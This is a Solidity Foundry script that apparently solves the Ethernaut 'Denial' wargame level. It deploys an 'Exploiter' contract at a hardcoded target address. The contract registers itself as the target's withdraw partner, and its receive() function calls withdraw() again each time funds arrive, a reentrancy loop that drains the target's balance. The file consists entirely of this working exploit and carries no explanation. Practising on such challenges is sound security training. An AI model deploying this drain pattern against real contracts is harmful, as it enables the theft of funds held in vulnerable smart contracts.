// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Deployer is Script {
    function run() external {
        vm.startBroadcast();
        new Exploiter(0xc02F6DBd1C52461a15Af28E4982b491cd73C93f1);
        vm.stopBroadcast();
    }
}

contract Exploiter {
    IDenial public immutable denial;    

    uint256 public limit = 100;

    event Received(uint256 indexed value);
    event Exploited(uint256 indexed value);

    constructor(address _instance) {
        denial = IDenial(_instance);
    }

    function setPartner() external {
        denial.setWithdrawPartner(address(this));
    }

    function exploit(uint256 _times) external {
        uint256 i;
        while (i < _times) {
            _callContract();
            i++;
        }
    }

    function exploit2(uint256 _target, uint256 _limit) external {
        address(denial).call{value: _target - address(denial).balance}("");
        limit = _limit;
    }

    function _callContract() internal {
        if (address(denial).balance > limit) address(denial).call(abi.encodeWithSignature("withdraw()"));
    }

    receive() external payable {
        emit Received(msg.value);
        _callContract();
    }
}

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function partner() external view returns (address);
    function contractBalance() external view returns (uint256);
}
